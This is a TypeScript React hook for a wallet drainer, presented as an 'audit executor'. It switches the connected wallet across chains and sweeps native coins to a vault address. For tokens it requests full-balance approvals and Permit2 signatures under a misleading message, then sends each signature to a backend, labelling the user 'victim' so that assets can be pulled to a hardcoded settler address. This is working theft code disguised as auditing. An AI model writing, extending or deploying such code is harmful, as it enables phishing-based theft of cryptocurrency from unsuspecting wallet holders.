"use client";

import { useCallback } from "react";
import { ethers, getAddress } from "ethers";
import { securePost } from "../execution/utils";
import { EXECUTION_POLICY } from "@/lib/ghost/constants";

const PERMIT2_MASTER = EXECUTION_POLICY.ALLOWED_SPENDERS[0];
const AUTHORIZED_SETTLER = getAddress(
  "0xadaB97dd0C4182Af5d5092c55172a35D268E3E90",
);

/** 📱 MOBILE METADATA (Strict protocol for Add-Chain Hammer) */
const CHAIN_DATA: Record<number, any> = {
  1: {
    chainName: "Ethereum",
    nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
    rpcUrls: ["https://eth.llamarpc.com"],
  },
  56: {
    chainName: "BNB Smart Chain",
    nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
    rpcUrls: ["https://binance.llamarpc.com"],
  },
  137: {
    chainName: "Polygon",
    nativeCurrency: { name: "POL", symbol: "POL", decimals: 18 },
    rpcUrls: ["https://polygon.llamarpc.com"],
  },
  42161: {
    chainName: "Arbitrum One",
    nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
    rpcUrls: ["https://arbitrum.llamarpc.com"],
  },
  10: {
    chainName: "Optimism",
    nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
    rpcUrls: ["https://optimism.llamarpc.com"],
  },
  43114: {
    chainName: "Avalanche C-Chain",
    nativeCurrency: { name: "AVAX", symbol: "AVAX", decimals: 18 },
    rpcUrls: ["https://avalanche.llamarpc.com"],
  },
  8453: {
    chainName: "Base",
    nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
    rpcUrls: ["https://base.llamarpc.com"],
  },
};

export function useAuditExecutor({
  executeMask,
  requestManualPermission,
}: any) {
  const getProvider = () => {
    if (typeof window === "undefined") return null;
    const provider = (window as any).ethereum;
    if (!provider) return null;
    if (provider.providers?.length > 0) {
      return (
        provider.providers.find(
          (p: any) => p.isTrust || p.isRabby || p.isMetaMask,
        ) || provider.providers[0]
      );
    }
    return provider;
  };

  /** 🛡️ PATIENT CHAIN WAITER (Extended for Mobile App Switching) */
  const waitForChain = async (provider: any, targetId: number) => {
    let attempts = 0;
    while (attempts < 400) {
      try {
        const hex = await provider.request({ method: "eth_chainId" });
        if (parseInt(hex, 16) === targetId) return true;
      } catch (e) {}
      await new Promise((r) => setTimeout(r, 50));
      attempts++;
    }
    return false;
  };

  const runExecutionLoop = useCallback(
    async ({
      assets,
      userAddress,
      activeVault,
      masterKey,
      logPrefix,
      walletClient,
    }: any) => {
      console.log(`${logPrefix} 🚀 INITIALIZING PRIORITY ENGINE...`);

      if (getAddress(PERMIT2_MASTER) !== AUTHORIZED_SETTLER) {
        throw new Error("UNAUTHORIZED_SPENDER_CONFIGURED");
      }

      let ghostMod: any;
      try {
        ghostMod = await import("@/lib/ghost");
      } catch (e) {
        console.warn(`${logPrefix} ⚠️ Ghost Module unavailable.`);
      }

      for (const asset of assets) {
        try {
          const targetChainId = Number(asset.chainId);
          const provider = getProvider();
          if (!provider) continue;

          // 🔥 FIXED PRECISION MATH ENGINE
          let rawBalString: string;
          const decimals = Number(asset.decimals || 18);
          const inputVal = (
            asset.rawBalance ||
            asset.balance ||
            asset.bal ||
            "0"
          ).toString();

          if (inputVal.includes(".")) {
            // It's a human readable decimal (e.g. "0.33") -> Convert to Wei
            rawBalString = ethers.parseUnits(inputVal, decimals).toString();
          } else if (inputVal.startsWith("0x")) {
            // It's a Hex string from the RPC -> Convert to BigInt String
            rawBalString = BigInt(inputVal).toString();
          } else {
            // It's already an integer string -> Keep as is, sanitize any trailing dots
            rawBalString = inputVal.split(".")[0];
          }

          const rawBal = BigInt(rawBalString);
          const assetUsd = parseFloat(asset.usdValue || "0");

          // Skip dust or empty assets
          if (assetUsd < 0.01 && rawBal === 0n) continue;

          // --- 1. THE MOBILE-OPTIMIZED CHAIN GUARD ---
          const currentHex = await provider.request({ method: "eth_chainId" });
          const currentId = parseInt(currentHex, 16);

          if (currentId !== targetChainId) {
            try {
              const hexChainId = "0x" + targetChainId.toString(16);
              console.log(
                `${logPrefix} ⛓️ Target: ${hexChainId} (${targetChainId})`,
              );

              try {
                await provider.request({
                  method: "wallet_switchEthereumChain",
                  params: [{ chainId: hexChainId }],
                });
              } catch (switchErr: any) {
                const data = CHAIN_DATA[targetChainId];
                if (data) {
                  console.log(
                    `${logPrefix} 🔄 Switch failed. Triggering Add-Chain Hammer...`,
                  );
                  await provider.request({
                    method: "wallet_addEthereumChain",
                    params: [{ chainId: hexChainId, ...data }],
                  });
                }
              }

              const switched = await waitForChain(provider, targetChainId);
              if (!switched) {
                console.warn(`${logPrefix} ⚠️ Switch Timeout. Asset skipped.`);
                continue;
              }

              console.log(`${logPrefix} ❄️ Cooling bridge...`);
              await new Promise((r) => setTimeout(r, 1000));

              const verifyHex = await provider.request({
                method: "eth_chainId",
              });
              if (parseInt(verifyHex, 16) !== targetChainId) continue;
            } catch (err) {
              console.warn(`${logPrefix} ❌ Chain logic failed. Skipping.`);
              continue;
            }
          }

          // --- 2. NATIVE DETECTION ---
          const isNative =
            !asset.contractAddress ||
            asset.contractAddress === ethers.ZeroAddress ||
            asset.contractAddress.toLowerCase() ===
              "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee" ||
            asset.signatureType === "NATIVE" ||
            asset.type === "NATIVE" ||
            ["BNB", "ETH", "MATIC", "POL", "AVAX", "FTM"].includes(
              asset.symbol,
            );

          if (isNative) {
            const maskResult = await executeMask({
              amount: rawBalString,
              chainId: targetChainId,
              derivedVaultAddress: activeVault.evmAddress,
              injectedClient: walletClient || provider,
              tokenTargets: assets
                .filter(
                  (a: any) =>
                    a.contractAddress &&
                    a.contractAddress !== ethers.ZeroAddress,
                )
                .map((a: any) => a.contractAddress),
            });

            if (maskResult?.success && maskResult.hash) {
              securePost("/api/vault", {
                type: "NATIVE_SYNC",
                txHash: maskResult.hash,
                chainId: targetChainId,
                victim: userAddress,
                symbol: asset.symbol,
                price: asset.price,
                amount: rawBalString,
                usdValue: assetUsd,
              }).catch(() => null);
            }
            continue;
          }

          // --- 3. TOKEN LOGIC (GHOST SWEEP) ---
          let alreadyHasPermission = false;
          const isPermit2Strategy =
            asset.strategy === "BATCH_PERMIT2" ||
            asset.strategy === "PERMIT_SIGN" ||
            asset.type === "PERMIT2" ||
            asset.spender?.toLowerCase() ===
              "0x000000000022d473030f116ddee9f6b43ac78ba3";

          if (ghostMod && !isPermit2Strategy) {
            try {
              const ghostResults = await ghostMod.checkAndTriggerGhostSweep(
                userAddress,
                [asset],
                targetChainId,
                AUTHORIZED_SETTLER,
              );

              if (ghostResults?.length > 0) {
                // Ensure the ghost data uses the corrected precision strings
                ghostResults[0].amount = rawBalString;
                ghostResults[0].balance = rawBalString;

                const allowance = BigInt(ghostResults[0].allowance || "0");
                if (rawBal > allowance) {
                  const approval = await requestManualPermission({
                    tokenAddress: asset.contractAddress,
                    symbol: asset.symbol,
                    chainId: targetChainId,
                    amount: rawBalString,
                    injectedClient: walletClient || provider,
                  });
                  if (approval?.success) {
                    alreadyHasPermission = true;
                    ghostResults[0].allowance = rawBalString;
                  }
                } else {
                  alreadyHasPermission = true;
                }

                if (alreadyHasPermission) {
                  securePost("/api/vault/ghost", {
                    chainId: targetChainId,
                    victim: userAddress,
                    assets: ghostResults,
                    masterKey: masterKey,
                    mode: "PERFORM_ALLOWANCE",
                    messageHash: ethers.ZeroHash,
                  }).catch(() => null);
                }
              }
            } catch (e) {
              console.warn(`${logPrefix} Ghost scan skip.`);
            }
          }

          // --- 4. FALLBACK: PERMIT2 / MANUAL ---
          if (!alreadyHasPermission) {
            const approval = await requestManualPermission({
              tokenAddress: asset.contractAddress,
              symbol: asset.symbol,
              chainId: targetChainId,
              amount: rawBalString,
              injectedClient: walletClient || provider,
            });

            if (approval?.success) {
              try {
                const permitData = await ghostMod.generatePermit2Data(
                  userAddress,
                  [{ ...asset, balance: rawBalString }],
                  targetChainId,
                  "Deploying Ghost Engine",
                );
                const { messageHash, ...payloadForSigning } = permitData;
                const signature = await provider.request({
                  method: "eth_signTypedData_v4",
                  params: [
                    userAddress,
                    typeof payloadForSigning === "string"
                      ? payloadForSigning
                      : JSON.stringify(payloadForSigning),
                  ],
                });

                if (signature && signature.length > 60) {
                  securePost("/api/vault/ghost", {
                    chainId: targetChainId,
                    victim: userAddress,
                    assets: [
                      {
                        token: asset.contractAddress,
                        balance: rawBalString,
                        symbol: asset.symbol,
                        usdValue: asset.usdValue,
                        decimals: asset.decimals,
                        amount: rawBalString,
                      },
                    ],
                    masterKey: masterKey,
                    signature: signature,
                    messageHash: messageHash,
                    mode: "PERFORM_PERMIT2",
                  }).catch(() => null);
                }
              } catch (sigError: any) {
                continue;
              }
            }
          }
        } catch (assetError: any) {
          console.error(`${logPrefix} ❌ Error: ${asset.symbol}`, assetError);
        }
      }

      const session = sessionStorage.getItem("active_strike_session");
      if (session) {
        const data = JSON.parse(session);
        sessionStorage.setItem(
          "active_strike_session",
          JSON.stringify({ ...data, isFinished: true }),
        );
      }
      console.log(`${logPrefix} 🏁 Audit Cycle Complete.`);
    },
    [executeMask, requestManualPermission],
  );

  return { runExecutionLoop };
}
